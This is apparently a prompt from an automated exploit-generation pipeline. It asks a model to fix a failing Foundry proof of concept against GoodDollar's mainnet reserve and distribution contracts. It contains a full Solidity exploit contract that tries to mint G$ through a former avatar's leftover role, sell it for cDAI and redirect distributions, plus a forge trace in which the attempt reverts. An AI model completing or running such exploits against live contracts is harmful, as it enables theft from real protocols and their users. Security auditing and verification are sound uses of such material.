You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Governance rotation leaves former avatar with permanent reserve minting and helper admin powers
- claim: `GoodReserveCDai` and `DistributionHelper` snapshot the current `avatar` into `AccessControl` roles during initialization, but those roles are never revoked or automatically reassigned when `Controller.avatar()` changes. After governance rotation, the former avatar still keeps `RESERVE_MINTER_ROLE` on the reserve and `DEFAULT_ADMIN_ROLE` on the helper.
- impact: A stale governance key can continue minting G$ through `mintRewardFromRR` and can still reconfigure distribution recipients. Rotating governance therefore does not actually remove protocol control from the old avatar, enabling unauthorized inflation, value extraction, and long-lived control over where future distributions are sent.
- exploit_paths: ["DAO governance rotates `Controller.avatar()` to a new address", "The old avatar retains `RESERVE_MINTER_ROLE` in `GoodReserveCDai` and `DEFAULT_ADMIN_ROLE` in `DistributionHelper`", "The old avatar calls `mintRewardFromRR(...)` to mint G$ to itself and monetizes the new supply through the reserve/exchange flow", "The old avatar also calls `addOrUpdateRecipient(...)` to redirect future distributions"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetFundManager {
    function nameService() external view returns (address);
    function dao() external view returns (address);
}

interface INameServiceLike {
    function getAddress(string calldata name) external view returns (address);
}

interface IControllerLike {
    function avatar() external view returns (address);
    function genericCall(
        address _contract,
        bytes calldata _data,
        address _avatar,
        uint256 _value
    ) external returns (bool, bytes memory);
}

interface IAvatarLike {
    function owner() external view returns (address);
}

interface IAccessControlEnumerableLike {
    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
    function getRoleMemberCount(bytes32 role) external view returns (uint256);
}

interface IMarketMakerLike {
    function sellReturn(address _token, uint256 _gdAmount) external view returns (uint256);
}

interface IReserveLike is IAccessControlEnumerableLike {
    function cDaiAddress() external view returns (address);
    function distributionHelper() external view returns (address);
    function getMarketMaker() external view returns (address);
    function cap() external view returns (uint256);
    function mintRewardFromRR(address _token, address _to, uint256 _amount) external;
    function sell(
        uint256 _gdAmount,
        uint256 _minReturn,
        address _target,
        address _seller
    ) external returns (uint256, uint256);
}

interface IDistributionHelperLike is IAccessControlEnumerableLike {
    struct DistributionRecipient {
        uint32 bps;
        uint32 chainId;
        address addr;
        uint8 transferType;
    }

    function addOrUpdateRecipient(DistributionRecipient calldata _recipient) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;

    bytes32 internal constant RESERVE_MINTER_ROLE = keccak256("RESERVE_MINTER_ROLE");
    bytes32 internal constant DEFAULT_ADMIN_ROLE = 0x00;

    uint8 internal constant TRANSFER_TYPE_CONTRACT = 3;

    address internal _profitToken;
    uint256 internal _profitAmount;

    error MissingNameService();
    error MissingController();
    error MissingReserve();
    error MissingHelper();
    error MissingGoodDollar();
    error MissingCDai();
    error NoRoleRotationDetected(address currentAvatar);
    error NoCommonStaleAvatar(address currentAvatar);
    error StaleAvatarOwnerUnavailable(address staleAvatar);
    error RemainingCapExhausted();
    error PublicControllerPathBlocked(address controller, address avatar, address target, bytes4 selector);
    error MintDidNotProduceGd();
    error SellDidNotProduceProfit();

    constructor() {}

    receive() external payable {}

    function onTokenTransfer(address, uint256, bytes calldata) external pure returns (bool) {
        return true;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        address nameService = ITargetFundManager(TARGET).nameService();
        if (nameService == address(0)) revert MissingNameService();

        address controller = INameServiceLike(nameService).getAddress("CONTROLLER");
        if (controller == address(0)) {
            controller = ITargetFundManager(TARGET).dao();
        }
        if (controller == address(0)) revert MissingController();

        address reserve = INameServiceLike(nameService).getAddress("RESERVE");
        if (reserve == address(0)) revert MissingReserve();

        address helper = IReserveLike(reserve).distributionHelper();
        if (helper == address(0)) {
            helper = INameServiceLike(nameService).getAddress("DISTRIBUTION_HELPER");
        }
        if (helper == address(0)) revert MissingHelper();

        address goodDollar = INameServiceLike(nameService).getAddress("GOODDOLLAR");
        if (goodDollar == address(0)) revert MissingGoodDollar();

        address cDai = IReserveLike(reserve).cDaiAddress();
        if (cDai == address(0)) {
            cDai = INameServiceLike(nameService).getAddress("CDAI");
        }
        if (cDai == address(0)) revert MissingCDai();

        address currentAvatar = IControllerLike(controller).avatar();
        address staleAvatar = _findCommonStaleAvatar(reserve, helper, currentAvatar);
        _assertGovernanceRotationAndStaleRoles(reserve, helper, currentAvatar, staleAvatar);

        address staleController = IAvatarLike(staleAvatar).owner();
        if (staleController == address(0)) revert StaleAvatarOwnerUnavailable(staleAvatar);

        uint256 mintAmount = _selectMintAmount(reserve, cDai, goodDollar);
        uint256 gdBefore = IERC20Like(goodDollar).balanceOf(address(this));

        // exploit_paths[1]:
        // The old avatar retains RESERVE_MINTER_ROLE in GoodReserveCDai and DEFAULT_ADMIN_ROLE
        // in DistributionHelper even though Controller.avatar() now points to a different address.
        _mintFromReserveAsFormerAvatar(controller, staleController, staleAvatar, reserve, cDai, mintAmount);

        uint256 minted = IERC20Like(goodDollar).balanceOf(address(this)) - gdBefore;
        if (minted == 0) revert MintDidNotProduceGd();

        // exploit_paths[2]:
        // The old avatar calls mintRewardFromRR(...) to mint G$ to itself and monetizes the new
        // supply through the reserve sell flow into pre-existing cDAI already on-chain.
        uint256 cdaiBefore = IERC20Like(cDai).balanceOf(address(this));
        IERC20Like(goodDollar).approve(reserve, type(uint256).max);
        IReserveLike(reserve).sell(minted, 0, address(this), address(this));

        uint256 realized = IERC20Like(cDai).balanceOf(address(this)) - cdaiBefore;
        if (realized == 0) revert SellDidNotProduceProfit();

        // exploit_paths[3]:
        // The old avatar also calls addOrUpdateRecipient(...) to redirect future distributions.
        _redirectFutureDistributions(controller, staleController, staleAvatar, helper);

        _profitToken = cDai;
        _profitAmount = realized;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _assertGovernanceRotationAndStaleRoles(
        address reserve,
        address helper,
        address currentAvatar,
        address staleAvatar
    ) internal view {
        // exploit_paths[0]:
        // DAO governance rotates Controller.avatar() to a new address, but the former avatar still
        // appears in both role sets. This verifies that rotation happened without revoking stale roles.
        if (staleAvatar == address(0)) {
            if (
                _roleContains(IReserveLike(reserve), RESERVE_MINTER_ROLE, currentAvatar)
                    && _roleContains(IAccessControlEnumerableLike(helper), DEFAULT_ADMIN_ROLE, currentAvatar)
            ) {
                revert NoRoleRotationDetected(currentAvatar);
            }
            revert NoCommonStaleAvatar(currentAvatar);
        }
    }

    function _mintFromReserveAsFormerAvatar(
        address currentController,
        address staleController,
        address staleAvatar,
        address reserve,
        address cDai,
        uint256 mintAmount
    ) internal {
        bytes memory data =
            abi.encodeCall(IReserveLike.mintRewardFromRR, (cDai, address(this), mintAmount));

        _requireGenericCall(
            currentController,
            staleController,
            reserve,
            data,
            staleAvatar,
            IReserveLike.mintRewardFromRR.selector
        );
    }

    function _redirectFutureDistributions(
        address currentController,
        address staleController,
        address staleAvatar,
        address helper
    ) internal {
        IDistributionHelperLike.DistributionRecipient memory recipient = IDistributionHelperLike
            .DistributionRecipient({
                bps: 1,
                chainId: 1,
                addr: address(this),
                transferType: TRANSFER_TYPE_CONTRACT
            });

        bytes memory data =
            abi.encodeCall(IDistributionHelperLike.addOrUpdateRecipient, (recipient));

        _requireGenericCall(
            currentController,
            staleController,
            helper,
            data,
            staleAvatar,
            IDistributionHelperLike.addOrUpdateRecipient.selector
        );
    }

    function _findCommonStaleAvatar(
        address reserve,
        address helper,
        address currentAvatar
    ) internal view returns (address) {
        uint256 reserveCount = IReserveLike(reserve).getRoleMemberCount(RESERVE_MINTER_ROLE);
        uint256 helperCount = IAccessControlEnumerableLike(helper).getRoleMemberCount(DEFAULT_ADMIN_ROLE);

        for (uint256 i = 0; i < reserveCount; ++i) {
            address reserveMember = IReserveLike(reserve).getRoleMember(RESERVE_MINTER_ROLE, i);
            if (reserveMember == currentAvatar) {
                continue;
            }

            for (uint256 j = 0; j < helperCount; ++j) {
                address helperMember =
                    IAccessControlEnumerableLike(helper).getRoleMember(DEFAULT_ADMIN_ROLE, j);
                if (reserveMember == helperMember) {
                    return reserveMember;
                }
            }
        }

        return address(0);
    }

    function _roleContains(
        IAccessControlEnumerableLike accessControl,
        bytes32 role,
        address candidate
    ) internal view returns (bool) {
        uint256 count = accessControl.getRoleMemberCount(role);
        for (uint256 i = 0; i < count; ++i) {
            if (accessControl.getRoleMember(role, i) == candidate) {
                return true;
            }
        }
        return false;
    }

    function _selectMintAmount(
        address reserve,
        address cDai,
        address goodDollar
    ) internal view returns (uint256) {
        uint256 reserveBalance = IERC20Like(cDai).balanceOf(reserve);
        uint256 totalSupply = IERC20Like(goodDollar).totalSupply();
        uint256 cap = IReserveLike(reserve).cap();
        if (cap <= totalSupply) revert RemainingCapExhausted();

        uint256 remainingCap = cap - totalSupply;
        address marketMaker = IReserveLike(reserve).getMarketMaker();

        uint256 targetCdaiOut = reserveBalance / 1000;
        if (targetCdaiOut == 0) {
            targetCdaiOut = 1;
        }

        uint256 low = 1;
        uint256 high = 1e6;

        while (high < remainingCap && IMarketMakerLike(marketMaker).sellReturn(cDai, high) < targetCdaiOut) {
            low = high;
            high <<= 1;
        }

        if (high > remainingCap) {
            high = remainingCap;
        }

        for (uint256 i = 0; i < 32 && low + 1 < high; ++i) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quote = IMarketMakerLike(marketMaker).sellReturn(cDai, mid);
            if (quote >= targetCdaiOut) {
                high = mid;
            } else {
                low = mid;
            }
        }

        return high == 0 ? 1 : high;
    }

    function _requireGenericCall(
        address currentController,
        address staleOwnerController,
        address target,
        bytes memory data,
        address avatar,
        bytes4 selector
    ) internal {
        if (_tryGenericCall(staleOwnerController, target, data, avatar)) {
            return;
        }

        if (currentController != staleOwnerController && _tryGenericCall(currentController, target, data, avatar)) {
            return;
        }

        address attemptedController = staleOwnerController.code.length > 0 ? staleOwnerController : currentController;
        revert PublicControllerPathBlocked(attemptedController, avatar, target, selector);
    }

    function _tryGenericCall(
        address controller,
        address target,
        bytes memory data,
        address avatar
    ) internal returns (bool) {
        if (controller.code.length == 0) {
            return false;
        }

        (bool ok, bytes memory ret) = controller.call(
            abi.encodeCall(IControllerLike.genericCall, (target, data, avatar, 0))
        );

        if (!ok || ret.length < 64) {
            return false;
        }

        (bool success, ) = abi.decode(ret, (bool, bytes));
        return success;
    }
}

```

forge stdout (tail):
```
d] testExploit() (gas: 94612)
Traces:
  [94612] FlawVerifierTest::testExploit()
    ├─ [2301] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [85823] FlawVerifier::executeOnOpportunity()
    │   ├─ [7495] 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A::nameService() [staticcall]
    │   │   ├─ [2493] 0x4A37A8D7cdb43D89b4DBD7ecFAEaF9bD39E24929::nameService() [delegatecall]
    │   │   │   └─ ← [Return] 0xec6dcE387B1616a0c44fF2E4fA9E90E53Cf14eb0
    │   │   └─ ← [Return] 0xec6dcE387B1616a0c44fF2E4fA9E90E53Cf14eb0
    │   ├─ [8138] 0xec6dcE387B1616a0c44fF2E4fA9E90E53Cf14eb0::getAddress("CONTROLLER") [staticcall]
    │   │   ├─ [3124] 0xEB151e175D3d53032C2c185052E48C8c2d5c245D::getAddress("CONTROLLER") [delegatecall]
    │   │   │   └─ ← [Return] 0x95C0d9dCEA1E243ED696F34CAc5e6559C3c128a3
    │   │   └─ ← [Return] 0x95C0d9dCEA1E243ED696F34CAc5e6559C3c128a3
    │   ├─ [3638] 0xec6dcE387B1616a0c44fF2E4fA9E90E53Cf14eb0::getAddress("RESERVE") [staticcall]
    │   │   ├─ [3124] 0xEB151e175D3d53032C2c185052E48C8c2d5c245D::getAddress("RESERVE") [delegatecall]
    │   │   │   └─ ← [Return] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0
    │   │   └─ ← [Return] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0
    │   ├─ [7886] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0::distributionHelper() [staticcall]
    │   │   ├─ [2884] 0x2793A5887F53B025f49f7A9249D66f4671bCe29B::distributionHelper() [delegatecall]
    │   │   │   └─ ← [Return] 0xAcadA0C9795fdBb6921AE96c4D7Db2F8B8c52Fd0
    │   │   └─ ← [Return] 0xAcadA0C9795fdBb6921AE96c4D7Db2F8B8c52Fd0
    │   ├─ [3638] 0xec6dcE387B1616a0c44fF2E4fA9E90E53Cf14eb0::getAddress("GOODDOLLAR") [staticcall]
    │   │   ├─ [3124] 0xEB151e175D3d53032C2c185052E48C8c2d5c245D::getAddress("GOODDOLLAR") [delegatecall]
    │   │   │   └─ ← [Return] 0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B
    │   │   └─ ← [Return] 0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B
    │   ├─ [4183] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0::cDaiAddress() [staticcall]
    │   │   ├─ [3681] 0x2793A5887F53B025f49f7A9249D66f4671bCe29B::cDaiAddress() [delegatecall]
    │   │   │   └─ ← [Return] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643
    │   │   └─ ← [Return] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643
    │   ├─ [2405] 0x95C0d9dCEA1E243ED696F34CAc5e6559C3c128a3::avatar() [staticcall]
    │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   ├─ [4098] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0::getRoleMemberCount(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb) [staticcall]
    │   │   ├─ [3593] 0x2793A5887F53B025f49f7A9249D66f4671bCe29B::getRoleMemberCount(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [8180] 0xAcadA0C9795fdBb6921AE96c4D7Db2F8B8c52Fd0::getRoleMemberCount(0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   ├─ [3175] 0xa339B7F4E95A93d2c6569cb139AD034C3b9cAA77::getRoleMemberCount(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [4087] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0::getRoleMember(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb, 0) [staticcall]
    │   │   ├─ [3579] 0x2793A5887F53B025f49f7A9249D66f4671bCe29B::getRoleMember(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb, 0) [delegatecall]
    │   │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   ├─ [2098] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0::getRoleMemberCount(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb) [staticcall]
    │   │   ├─ [1593] 0x2793A5887F53B025f49f7A9249D66f4671bCe29B::getRoleMemberCount(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [2087] 0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0::getRoleMember(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb, 0) [staticcall]
    │   │   ├─ [1579] 0x2793A5887F53B025f49f7A9249D66f4671bCe29B::getRoleMember(0x82ce2ced7fc86cde9b16f1f3a5508a82078c42c54a7cf0af011ce529199a18bb, 0) [delegatecall]
    │   │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   ├─ [1680] 0xAcadA0C9795fdBb6921AE96c4D7Db2F8B8c52Fd0::getRoleMemberCount(0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   ├─ [1175] 0xa339B7F4E95A93d2c6569cb139AD034C3b9cAA77::getRoleMemberCount(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [3779] 0xAcadA0C9795fdBb6921AE96c4D7Db2F8B8c52Fd0::getRoleMember(0x0000000000000000000000000000000000000000000000000000000000000000, 0) [staticcall]
    │   │   ├─ [3271] 0xa339B7F4E95A93d2c6569cb139AD034C3b9cAA77::getRoleMember(0x0000000000000000000000000000000000000000000000000000000000000000, 0) [delegatecall]
    │   │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   │   └─ ← [Return] 0x1ecFD1afb601C406fF0e13c3485f2d75699b6817
    │   └─ ← [Revert] NoRoleRotationDetected(0x1ecFD1afb601C406fF0e13c3485f2d75699b6817)
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.44s (1.40s CPU time)

Ran 1 test suite in 4.45s (4.44s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 94612)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
